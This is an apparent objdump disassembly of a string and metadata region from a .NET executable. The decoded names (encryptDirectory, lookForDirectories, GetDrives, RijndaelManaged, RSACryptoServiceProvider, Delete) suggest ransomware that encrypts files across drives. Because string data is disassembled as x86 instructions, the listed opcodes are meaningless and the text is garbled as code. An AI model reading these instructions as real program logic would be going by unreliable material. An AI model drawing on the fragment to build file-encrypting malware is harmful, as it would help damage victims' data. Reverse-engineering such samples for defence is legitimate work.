  4051d4:	65 74 50             	gs je  0x405227
  4051d7:	72 6f                	jb     0x405248
  4051d9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4051dc:	73 65                	jae    0x405243
  4051de:	73 00                	jae    0x4051e0
  4051e0:	47                   	inc    %edi
  4051e1:	65 74 43             	gs je  0x405227
  4051e4:	75 72                	jne    0x405258
  4051e6:	72 65                	jb     0x40524d
  4051e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4051e9:	74 50                	je     0x40523b
  4051eb:	72 6f                	jb     0x40525c
  4051ed:	63 65 73             	arpl   %esp,0x73(%ebp)
  4051f0:	73 00                	jae    0x4051f2
  4051f2:	50                   	push   %eax
  4051f3:	72 6f                	jb     0x405264
  4051f5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4051f8:	73 4d                	jae    0x405247
  4051fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4051fb:	64 75 6c             	fs jne 0x40526a
  4051fe:	65 43                	gs inc %ebx
  405200:	6f                   	outsl  %ds:(%esi),(%dx)
  405201:	6c                   	insb   (%dx),%es:(%edi)
  405202:	6c                   	insb   (%dx),%es:(%edi)
  405203:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  405208:	6e                   	outsb  %ds:(%esi),(%dx)
  405209:	00 67 65             	add    %ah,0x65(%edi)
  40520c:	74 5f                	je     0x40526d
  40520e:	4d                   	dec    %ebp
  40520f:	6f                   	outsl  %ds:(%esi),(%dx)
  405210:	64 75 6c             	fs jne 0x40527f
  405213:	65 73 00             	gs jae 0x405216
  405216:	50                   	push   %eax
  405217:	72 6f                	jb     0x405288
  405219:	63 65 73             	arpl   %esp,0x73(%ebp)
  40521c:	73 4d                	jae    0x40526b
  40521e:	6f                   	outsl  %ds:(%esi),(%dx)
  40521f:	64 75 6c             	fs jne 0x40528e
  405222:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405226:	74 5f                	je     0x405287
  405228:	49                   	dec    %ecx
  405229:	74 65                	je     0x405290
  40522b:	6d                   	insl   (%dx),%es:(%edi)
  40522c:	00 67 65             	add    %ah,0x65(%edi)
  40522f:	74 5f                	je     0x405290
  405231:	46                   	inc    %esi
  405232:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  405239:	00 
  40523a:	47                   	inc    %edi
  40523b:	65 74 45             	gs je  0x405283
  40523e:	78 65                	js     0x4052a5
  405240:	63 75 74             	arpl   %esi,0x74(%ebp)
  405243:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  40524a:	6d                   	insl   (%dx),%es:(%edi)
  40524b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40524f:	6f                   	outsl  %ds:(%esi),(%dx)
  405250:	70 5f                	jo     0x4052b1
  405252:	45                   	inc    %ebp
  405253:	71 75                	jno    0x4052ca
  405255:	61                   	popa
  405256:	6c                   	insb   (%dx),%es:(%edi)
  405257:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  40525e:	5f 
  40525f:	49                   	dec    %ecx
  405260:	64 00 45 78          	add    %al,%fs:0x78(%ebp)
  405264:	63 65 70             	arpl   %esp,0x70(%ebp)
  405267:	74 69                	je     0x4052d2
  405269:	6f                   	outsl  %ds:(%esi),(%dx)
  40526a:	6e                   	outsb  %ds:(%esi),(%dx)
  40526b:	00 53 79             	add    %dl,0x79(%ebx)
  40526e:	73 74                	jae    0x4052e4
  405270:	65 6d                	gs insl (%dx),%es:(%edi)
  405272:	2e 54                	cs push %esp
  405274:	65 78 74             	gs js  0x4052eb
  405277:	00 53 74             	add    %dl,0x74(%ebx)
  40527a:	72 69                	jb     0x4052e5
  40527c:	6e                   	outsb  %ds:(%esi),(%dx)
  40527d:	67 42                	addr16 inc %edx
  40527f:	75 69                	jne    0x4052ea
  405281:	6c                   	insb   (%dx),%es:(%edi)
  405282:	64 65 72 00          	fs gs jb 0x405286
  405286:	67 65 74 5f          	addr16 gs je 0x4052e9
  40528a:	4c                   	dec    %esp
  40528b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40528d:	67 74 68             	addr16 je 0x4052f8
  405290:	00 4e 65             	add    %cl,0x65(%esi)
  405293:	78 74                	js     0x405309
  405295:	00 67 65             	add    %ah,0x65(%edi)
  405298:	74 5f                	je     0x4052f9
  40529a:	43                   	inc    %ebx
  40529b:	68 61 72 73 00       	push   $0x737261
  4052a0:	41                   	inc    %ecx
  4052a1:	70 70                	jo     0x405313
  4052a3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4052a5:	64 00 54 6f 53       	add    %dl,%fs:0x53(%edi,%ebp,2)
  4052aa:	74 72                	je     0x40531e
  4052ac:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  4052b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b4:	64 69 6e 67 00 67 65 	imul   $0x74656700,%fs:0x67(%esi),%ebp
  4052bb:	74 
  4052bc:	5f                   	pop    %edi
  4052bd:	55                   	push   %ebp
  4052be:	54                   	push   %esp
  4052bf:	46                   	inc    %esi
  4052c0:	38 00                	cmp    %al,(%eax)
  4052c2:	47                   	inc    %edi
  4052c3:	65 74 42             	gs je  0x405308
  4052c6:	79 74                	jns    0x40533c
  4052c8:	65 73 00             	gs jae 0x4052cb
  4052cb:	43                   	inc    %ebx
  4052cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4052cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4052ce:	76 65                	jbe    0x405335
  4052d0:	72 74                	jb     0x405346
  4052d2:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  4052d6:	61                   	popa
  4052d7:	73 65                	jae    0x40533e
  4052d9:	36 34 53             	ss xor $0x53,%al
  4052dc:	74 72                	je     0x405350
  4052de:	69 6e 67 00 3c 3e 63 	imul   $0x633e3c00,0x67(%esi),%ebp
  4052e5:	5f                   	pop    %edi
  4052e6:	5f                   	pop    %edi
  4052e7:	44                   	inc    %esp
  4052e8:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4052ef:	6c                   	insb   (%dx),%es:(%edi)
  4052f0:	61                   	popa
  4052f1:	73 73                	jae    0x405366
  4052f3:	35 00 65 78 74       	xor    $0x74786500,%eax
  4052f8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4052fa:	73 69                	jae    0x405365
  4052fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4052fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4052fe:	00 3c 65 6e 63 72 79 	add    %bh,0x7972636e(,%eiz,2)
  405305:	70 74                	jo     0x40537b
  405307:	44                   	inc    %esp
  405308:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40530f:	79 3e                	jns    0x40534f
  405311:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  405314:	34 00                	xor    $0x0,%al
  405316:	45                   	inc    %ebp
  405317:	00 54 6f 4c          	add    %dl,0x4c(%edi,%ebp,2)
  40531b:	6f                   	outsl  %ds:(%esi),(%dx)
  40531c:	77 65                	ja     0x405383
  40531e:	72 00                	jb     0x405320
  405320:	44                   	inc    %esp
  405321:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  405328:	79 00                	jns    0x40532a
  40532a:	47                   	inc    %edi
  40532b:	65 74 46             	gs je  0x405374
  40532e:	69 6c 65 73 00 47 65 	imul   $0x74654700,0x73(%ebp,%eiz,2),%ebp
  405335:	74 
  405336:	45                   	inc    %ebp
  405337:	78 74                	js     0x4053ad
  405339:	65 6e                	outsb  %gs:(%esi),(%dx)
  40533b:	73 69                	jae    0x4053a6
  40533d:	6f                   	outsl  %ds:(%esi),(%dx)
  40533e:	6e                   	outsb  %ds:(%esi),(%dx)
  40533f:	00 47 65             	add    %al,0x65(%edi)
  405342:	74 46                	je     0x40538a
  405344:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40534b:	00 
  40534c:	50                   	push   %eax
  40534d:	72 65                	jb     0x4053b4
  40534f:	64 69 63 61 74 65 60 	imul   $0x31606574,%fs:0x61(%ebx),%esp
  405356:	31 
  405357:	00 41 72             	add    %al,0x72(%ecx)
  40535a:	72 61                	jb     0x4053bd
  40535c:	79 00                	jns    0x40535e
  40535e:	45                   	inc    %ebp
  40535f:	78 69                	js     0x4053ca
  405361:	73 74                	jae    0x4053d7
  405363:	73 00                	jae    0x405365
  405365:	46                   	inc    %esi
  405366:	69 6c 65 49 6e 66 6f 	imul   $0x6f666e,0x49(%ebp,%eiz,2),%ebp
  40536d:	00 
  40536e:	46                   	inc    %esi
  40536f:	69 6c 65 53 79 73 74 	imul   $0x65747379,0x53(%ebp,%eiz,2),%ebp
  405376:	65 
  405377:	6d                   	insl   (%dx),%es:(%edi)
  405378:	49                   	dec    %ecx
  405379:	6e                   	outsb  %ds:(%esi),(%dx)
  40537a:	66 6f                	outsw  %ds:(%esi),(%dx)
  40537c:	00 46 69             	add    %al,0x69(%esi)
  40537f:	6c                   	insb   (%dx),%es:(%edi)
  405380:	65 41                	gs inc %ecx
  405382:	74 74                	je     0x4053f8
  405384:	72 69                	jb     0x4053ef
  405386:	62 75 74             	bound  %esi,0x74(%ebp)
  405389:	65 73 00             	gs jae 0x40538c
  40538c:	73 65                	jae    0x4053f3
  40538e:	74 5f                	je     0x4053ef
  405390:	41                   	inc    %ecx
  405391:	74 74                	je     0x405407
  405393:	72 69                	jb     0x4053fe
  405395:	62 75 74             	bound  %esi,0x74(%ebp)
  405398:	65 73 00             	gs jae 0x40539b
  40539b:	43                   	inc    %ebx
  40539c:	6f                   	outsl  %ds:(%esi),(%dx)
  40539d:	6e                   	outsb  %ds:(%esi),(%dx)
  40539e:	63 61 74             	arpl   %esp,0x74(%ecx)
  4053a1:	00 46 69             	add    %al,0x69(%esi)
  4053a4:	6c                   	insb   (%dx),%es:(%edi)
  4053a5:	65 00 49 45          	add    %cl,%gs:0x45(%ecx)
  4053a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4053aa:	75 6d                	jne    0x405419
  4053ac:	65 72 61             	gs jb  0x405410
  4053af:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4053b3:	31 00                	xor    %eax,(%eax)
  4053b5:	57                   	push   %edi
  4053b6:	72 69                	jb     0x405421
  4053b8:	74 65                	je     0x40541f
  4053ba:	41                   	inc    %ecx
  4053bb:	6c                   	insb   (%dx),%es:(%edi)
  4053bc:	6c                   	insb   (%dx),%es:(%edi)
  4053bd:	4c                   	dec    %esp
  4053be:	69 6e 65 73 00 47 65 	imul   $0x65470073,0x65(%esi),%ebp
  4053c5:	74 44                	je     0x40540b
  4053c7:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4053ce:	69 65 73 00 43 6f 6e 	imul   $0x6e6f4300,0x73(%ebp),%esp
  4053d5:	74 61                	je     0x405438
  4053d7:	69 6e 73 00 41 70 70 	imul   $0x70704100,0x73(%esi),%ebp
  4053de:	65 6e                	outsb  %gs:(%esi),(%dx)
  4053e0:	64 4c                	fs dec %esp
  4053e2:	69 6e 65 00 42 79 74 	imul   $0x74794200,0x65(%esi),%ebp
  4053e9:	65 00 3c 50          	add    %bh,%gs:(%eax,%edx,2)
  4053ed:	72 69                	jb     0x405458
  4053ef:	76 61                	jbe    0x405452
  4053f1:	74 65                	je     0x405458
  4053f3:	49                   	dec    %ecx
  4053f4:	6d                   	insl   (%dx),%es:(%edi)
  4053f5:	70 6c                	jo     0x405463
  4053f7:	65 6d                	gs insl (%dx),%es:(%edi)
  4053f9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4053fb:	74 61                	je     0x40545e
  4053fd:	74 69                	je     0x405468
  4053ff:	6f                   	outsl  %ds:(%esi),(%dx)
  405400:	6e                   	outsb  %ds:(%esi),(%dx)
  405401:	44                   	inc    %esp
  405402:	65 74 61             	gs je  0x405466
  405405:	69 6c 73 3e 7b 41 32 	imul   $0x3732417b,0x3e(%ebx,%esi,2),%ebp
  40540c:	37 
  40540d:	37                   	aaa
  40540e:	41                   	inc    %ecx
  40540f:	37                   	aaa
  405410:	38 31                	cmp    %dh,(%ecx)
  405412:	2d 38 35 43 43       	sub    $0x43433538,%eax
  405417:	2d 34 30 46 35       	sub    $0x35463034,%eax
  40541c:	2d 41 45 46 35       	sub    $0x35464541,%eax
  405421:	2d 43 41 30 35       	sub    $0x35304143,%eax
  405426:	38 43 36             	cmp    %al,0x36(%ebx)
  405429:	39 39                	cmp    %edi,(%ecx)
  40542b:	43                   	inc    %ebx
  40542c:	43                   	inc    %ebx
  40542d:	44                   	inc    %esp
  40542e:	7d 00                	jge    0x405430
  405430:	24 24                	and    $0x24,%al
  405432:	6d                   	insl   (%dx),%es:(%edi)
  405433:	65 74 68             	gs je  0x40549e
  405436:	6f                   	outsl  %ds:(%esi),(%dx)
  405437:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  40543b:	30 30                	xor    %dh,(%eax)
  40543d:	30 30                	xor    %dh,(%eax)
  40543f:	30 64 2d 31          	xor    %ah,0x31(%ebp,%ebp,1)
  405443:	00 52 75             	add    %dl,0x75(%edx)
  405446:	6e                   	outsb  %ds:(%esi),(%dx)
  405447:	74 69                	je     0x4054b2
  405449:	6d                   	insl   (%dx),%es:(%edi)
  40544a:	65 48                	gs dec %eax
  40544c:	65 6c                	gs insb (%dx),%es:(%edi)
  40544e:	70 65                	jo     0x4054b5
  405450:	72 73                	jb     0x4054c5
  405452:	00 52 75             	add    %dl,0x75(%edx)
  405455:	6e                   	outsb  %ds:(%esi),(%dx)
  405456:	74 69                	je     0x4054c1
  405458:	6d                   	insl   (%dx),%es:(%edi)
  405459:	65 46                	gs inc %esi
  40545b:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  405462:	64 6c                	fs insb (%dx),%es:(%edi)
  405464:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  405468:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40546f:	65 
  405470:	41                   	inc    %ecx
  405471:	72 72                	jb     0x4054e5
  405473:	61                   	popa
  405474:	79 00                	jns    0x405476
  405476:	46                   	inc    %esi
  405477:	69 6c 65 53 74 72 65 	imul   $0x61657274,0x53(%ebp,%eiz,2),%ebp
  40547e:	61 
  40547f:	6d                   	insl   (%dx),%es:(%edi)
  405480:	00 46 69             	add    %al,0x69(%esi)
  405483:	6c                   	insb   (%dx),%es:(%edi)
  405484:	65 4d                	gs dec %ebp
  405486:	6f                   	outsl  %ds:(%esi),(%dx)
  405487:	64 65 00 53 79       	fs add %dl,%gs:0x79(%ebx)
  40548c:	73 74                	jae    0x405502
  40548e:	65 6d                	gs insl (%dx),%es:(%edi)
  405490:	2e 53                	cs push %ebx
  405492:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  405496:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40549d:	70 
  40549e:	74 6f                	je     0x40550f
  4054a0:	67 72 61             	addr16 jb 0x405504
  4054a3:	70 68                	jo     0x40550d
  4054a5:	79 00                	jns    0x4054a7
  4054a7:	52                   	push   %edx
  4054a8:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  4054af:	4d                   	dec    %ebp
  4054b0:	61                   	popa
  4054b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4054b2:	61                   	popa
  4054b3:	67 65 64 00 53 79    	gs add %dl,%fs:0x79(%bp,%di)
  4054b9:	6d                   	insl   (%dx),%es:(%edi)
  4054ba:	6d                   	insl   (%dx),%es:(%edi)
  4054bb:	65 74 72             	gs je  0x405530
  4054be:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4054c5:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  4054cc:	74 
  4054cd:	5f                   	pop    %edi
  4054ce:	4b                   	dec    %ebx
  4054cf:	65 79 53             	gs jns 0x405525
  4054d2:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4054d9:	5f                   	pop    %edi
  4054da:	42                   	inc    %edx
  4054db:	6c                   	insb   (%dx),%es:(%edi)
  4054dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4054dd:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  4054e0:	69 7a 65 00 50 61 64 	imul   $0x64615000,0x65(%edx),%edi
  4054e7:	64 69 6e 67 4d 6f 64 	imul   $0x65646f4d,%fs:0x67(%esi),%ebp
  4054ee:	65 
  4054ef:	00 73 65             	add    %dh,0x65(%ebx)
  4054f2:	74 5f                	je     0x405553
  4054f4:	50                   	push   %eax
  4054f5:	61                   	popa
  4054f6:	64 64 69 6e 67 00 52 	fs imul $0x63665200,%fs:0x67(%esi),%ebp
  4054fd:	66 63 
  4054ff:	32 38                	xor    (%eax),%bh
  405501:	39 38                	cmp    %edi,(%eax)
  405503:	44                   	inc    %esp
  405504:	65 72 69             	gs jb  0x405570
  405507:	76 65                	jbe    0x40556e
  405509:	42                   	inc    %edx
  40550a:	79 74                	jns    0x405580
  40550c:	65 73 00             	gs jae 0x40550f
  40550f:	67 65 74 5f          	addr16 gs je 0x405572
  405513:	4b                   	dec    %ebx
  405514:	65 79 53             	gs jns 0x40556a
  405517:	69 7a 65 00 44 65 72 	imul   $0x72654400,0x65(%edx),%edi
  40551e:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  405525:	73 00                	jae    0x405527
  405527:	73 65                	jae    0x40558e
  405529:	74 5f                	je     0x40558a
  40552b:	4b                   	dec    %ebx
  40552c:	65 79 00             	gs jns 0x40552f
  40552f:	67 65 74 5f          	addr16 gs je 0x405592
  405533:	42                   	inc    %edx
  405534:	6c                   	insb   (%dx),%es:(%edi)
  405535:	6f                   	outsl  %ds:(%esi),(%dx)
  405536:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  405539:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  405540:	5f                   	pop    %edi
  405541:	49                   	dec    %ecx
  405542:	56                   	push   %esi
  405543:	00 43 69             	add    %al,0x69(%ebx)
  405546:	70 68                	jo     0x4055b0
  405548:	65 72 4d             	gs jb  0x405598
  40554b:	6f                   	outsl  %ds:(%esi),(%dx)
  40554c:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  405551:	74 5f                	je     0x4055b2
  405553:	4d                   	dec    %ebp
  405554:	6f                   	outsl  %ds:(%esi),(%dx)
  405555:	64 65 00 53 74       	fs add %dl,%gs:0x74(%ebx)
  40555a:	72 65                	jb     0x4055c1
  40555c:	61                   	popa
  40555d:	6d                   	insl   (%dx),%es:(%edi)
  40555e:	00 57 72             	add    %dl,0x72(%edi)
  405561:	69 74 65 00 49 43 72 	imul   $0x79724349,0x0(%ebp,%eiz,2),%esi
  405568:	79 
  405569:	70 74                	jo     0x4055df
  40556b:	6f                   	outsl  %ds:(%esi),(%dx)
  40556c:	54                   	push   %esp
  40556d:	72 61                	jb     0x4055d0
  40556f:	6e                   	outsb  %ds:(%esi),(%dx)
  405570:	73 66                	jae    0x4055d8
  405572:	6f                   	outsl  %ds:(%esi),(%dx)
  405573:	72 6d                	jb     0x4055e2
  405575:	00 43 72             	add    %al,0x72(%ebx)
  405578:	65 61                	gs popa
  40557a:	74 65                	je     0x4055e1
  40557c:	45                   	inc    %ebp
  40557d:	6e                   	outsb  %ds:(%esi),(%dx)
  40557e:	63 72 79             	arpl   %esi,0x79(%edx)
  405581:	70 74                	jo     0x4055f7
  405583:	6f                   	outsl  %ds:(%esi),(%dx)
  405584:	72 00                	jb     0x405586
  405586:	43                   	inc    %ebx
  405587:	72 79                	jb     0x405602
  405589:	70 74                	jo     0x4055ff
  40558b:	6f                   	outsl  %ds:(%esi),(%dx)
  40558c:	53                   	push   %ebx
  40558d:	74 72                	je     0x405601
  40558f:	65 61                	gs popa
  405591:	6d                   	insl   (%dx),%es:(%edi)
  405592:	00 43 72             	add    %al,0x72(%ebx)
  405595:	79 70                	jns    0x405607
  405597:	74 6f                	je     0x405608
  405599:	53                   	push   %ebx
  40559a:	74 72                	je     0x40560e
  40559c:	65 61                	gs popa
  40559e:	6d                   	insl   (%dx),%es:(%edi)
  40559f:	4d                   	dec    %ebp
  4055a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4055a1:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  4055a6:	70 79                	jo     0x405621
  4055a8:	54                   	push   %esp
  4055a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4055aa:	00 46 6c             	add    %al,0x6c(%esi)
  4055ad:	75 73                	jne    0x405622
  4055af:	68 00 43 6c 6f       	push   $0x6f6c4300
  4055b4:	73 65                	jae    0x40561b
  4055b6:	00 46 69             	add    %al,0x69(%esi)
  4055b9:	6c                   	insb   (%dx),%es:(%edi)
  4055ba:	65 41                	gs inc %ecx
  4055bc:	63 63 65             	arpl   %esp,0x65(%ebx)
  4055bf:	73 73                	jae    0x405634
  4055c1:	00 53 74             	add    %dl,0x74(%ebx)
  4055c4:	72 65                	jb     0x40562b
  4055c6:	61                   	popa
  4055c7:	6d                   	insl   (%dx),%es:(%edi)
  4055c8:	57                   	push   %edi
  4055c9:	72 69                	jb     0x405634
  4055cb:	74 65                	je     0x405632
  4055cd:	72 00                	jb     0x4055cf
  4055cf:	54                   	push   %esp
  4055d0:	65 78 74             	gs js  0x405647
  4055d3:	57                   	push   %edi
  4055d4:	72 69                	jb     0x40563f
  4055d6:	74 65                	je     0x40563d
  4055d8:	72 00                	jb     0x4055da
  4055da:	49                   	dec    %ecx
  4055db:	44                   	inc    %esp
  4055dc:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4055e3:	6c                   	insb   (%dx),%es:(%edi)
  4055e4:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  4055e9:	70 6f                	jo     0x40565a
  4055eb:	73 65                	jae    0x405652
  4055ed:	00 57 72             	add    %dl,0x72(%edi)
  4055f0:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  4055f7:	65 
  4055f8:	78 74                	js     0x40566e
  4055fa:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  4055fe:	65 74 65             	gs je  0x405666
  405601:	00 67 65             	add    %ah,0x65(%edi)
  405604:	74 5f                	je     0x405665
  405606:	41                   	inc    %ecx
  405607:	53                   	push   %ebx
  405608:	43                   	inc    %ebx
  405609:	49                   	dec    %ecx
  40560a:	49                   	dec    %ecx
  40560b:	00 24 24             	add    %ah,(%esp)
  40560e:	6d                   	insl   (%dx),%es:(%edi)
  40560f:	65 74 68             	gs je  0x40567a
  405612:	6f                   	outsl  %ds:(%esi),(%dx)
  405613:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  405617:	30 30                	xor    %dh,(%eax)
  405619:	30 30                	xor    %dh,(%eax)
  40561b:	30 65 2d             	xor    %ah,0x2d(%ebp)
  40561e:	31 00                	xor    %eax,(%eax)
  405620:	46                   	inc    %esi
  405621:	69 6c 65 53 68 61 72 	imul   $0x65726168,0x53(%ebp,%eiz,2),%ebp
  405628:	65 
  405629:	00 53 65             	add    %dl,0x65(%ebx)
  40562c:	74 4c                	je     0x40567a
  40562e:	65 6e                	outsb  %gs:(%esi),(%dx)
  405630:	67 74 68             	addr16 je 0x40569b
  405633:	00 52 4e             	add    %dl,0x4e(%edx)
  405636:	47                   	inc    %edi
  405637:	43                   	inc    %ebx
  405638:	72 79                	jb     0x4056b3
  40563a:	70 74                	jo     0x4056b0
  40563c:	6f                   	outsl  %ds:(%esi),(%dx)
  40563d:	53                   	push   %ebx
  40563e:	65 72 76             	gs jb  0x4056b7
  405641:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  405648:	69 64 65 72 00 52 61 	imul   $0x6e615200,0x72(%ebp,%eiz,2),%esp
  40564f:	6e 
  405650:	64 6f                	outsl  %fs:(%esi),(%dx)
  405652:	6d                   	insl   (%dx),%es:(%edi)
  405653:	4e                   	dec    %esi
  405654:	75 6d                	jne    0x4056c3
  405656:	62 65 72             	bound  %esp,0x72(%ebp)
  405659:	47                   	inc    %edi
  40565a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40565c:	65 72 61             	gs jb  0x4056c0
  40565f:	74 6f                	je     0x4056d0
  405661:	72 00                	jb     0x405663
  405663:	52                   	push   %edx
  405664:	53                   	push   %ebx
  405665:	41                   	inc    %ecx
  405666:	43                   	inc    %ebx
  405667:	72 79                	jb     0x4056e2
  405669:	70 74                	jo     0x4056df
  40566b:	6f                   	outsl  %ds:(%esi),(%dx)
  40566c:	53                   	push   %ebx
  40566d:	65 72 76             	gs jb  0x4056e6
  405670:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  405677:	69 64 65 72 00 41 73 	imul   $0x79734100,0x72(%ebp,%eiz,2),%esp
  40567e:	79 
  40567f:	6d                   	insl   (%dx),%es:(%edi)
  405680:	6d                   	insl   (%dx),%es:(%edi)
  405681:	65 74 72             	gs je  0x4056f6
  405684:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40568b:	69 74 68 6d 00 46 72 	imul   $0x6f724600,0x6d(%eax,%ebp,2),%esi
  405692:	6f 
  405693:	6d                   	insl   (%dx),%es:(%edi)
  405694:	58                   	pop    %eax
  405695:	6d                   	insl   (%dx),%es:(%edi)
  405696:	6c                   	insb   (%dx),%es:(%edi)
  405697:	53                   	push   %ebx
  405698:	74 72                	je     0x40570c
  40569a:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
  4056a1:	72 79                	jb     0x40571c
  4056a3:	70 74                	jo     0x405719
  4056a5:	00 73 65             	add    %dh,0x65(%ebx)
  4056a8:	74 5f                	je     0x405709
  4056aa:	50                   	push   %eax
  4056ab:	65 72 73             	gs jb  0x405721
  4056ae:	69 73 74 4b 65 79 49 	imul   $0x4979654b,0x74(%ebx),%esi
  4056b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4056b6:	43                   	inc    %ebx
  4056b7:	73 70                	jae    0x405729
  4056b9:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4056bc:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4056bf:	44                   	inc    %esp
  4056c0:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4056c7:	6c                   	insb   (%dx),%es:(%edi)
  4056c8:	61                   	popa
  4056c9:	73 73                	jae    0x40573e
  4056cb:	38 00                	cmp    %al,(%eax)
  4056cd:	64 69 72 4e 61 6d 65 	imul   $0x656d61,%fs:0x4e(%edx),%esi
  4056d4:	00 
  4056d5:	3c 6c                	cmp    $0x6c,%al
  4056d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4056d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4056d9:	6b 46 6f 72          	imul   $0x72,0x6f(%esi),%eax
  4056dd:	44                   	inc    %esp
  4056de:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4056e5:	69 65 73 3e 62 5f 5f 	imul   $0x5f5f623e,0x73(%ebp),%esp
  4056ec:	37                   	aaa
  4056ed:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4056f1:	76 65                	jbe    0x405758
  4056f3:	49                   	dec    %ecx
  4056f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4056f5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4056f7:	00 47 65             	add    %al,0x65(%edi)
  4056fa:	74 44                	je     0x405740
  4056fc:	72 69                	jb     0x405767
  4056fe:	76 65                	jbe    0x405765
  405700:	73 00                	jae    0x405702
  405702:	44                   	inc    %esp
  405703:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40570a:	79 49                	jns    0x405755
  40570c:	6e                   	outsb  %ds:(%esi),(%dx)
  40570d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40570f:	00 67 65             	add    %ah,0x65(%edi)
  405712:	74 5f                	je     0x405773
  405714:	4e                   	dec    %esi
  405715:	61                   	popa
  405716:	6d                   	insl   (%dx),%es:(%edi)
  405717:	65 00 41 70          	add    %al,%gs:0x70(%ecx)
  40571b:	70 44                	jo     0x405761
  40571d:	6f                   	outsl  %ds:(%esi),(%dx)
  40571e:	6d                   	insl   (%dx),%es:(%edi)
  40571f:	61                   	popa
  405720:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  405727:	43                   	inc    %ebx
  405728:	75 72                	jne    0x40579c
  40572a:	72 65                	jb     0x405791
  40572c:	6e                   	outsb  %ds:(%esi),(%dx)
  40572d:	74 44                	je     0x405773
  40572f:	6f                   	outsl  %ds:(%esi),(%dx)
  405730:	6d                   	insl   (%dx),%es:(%edi)
  405731:	61                   	popa
  405732:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  405739:	46                   	inc    %esi
  40573a:	72 69                	jb     0x4057a5
  40573c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40573e:	64 6c                	fs insb (%dx),%es:(%edi)
  405740:	79 4e                	jns    0x405790
  405742:	61                   	popa
  405743:	6d                   	insl   (%dx),%es:(%edi)
  405744:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405748:	70 79                	jo     0x4057c3
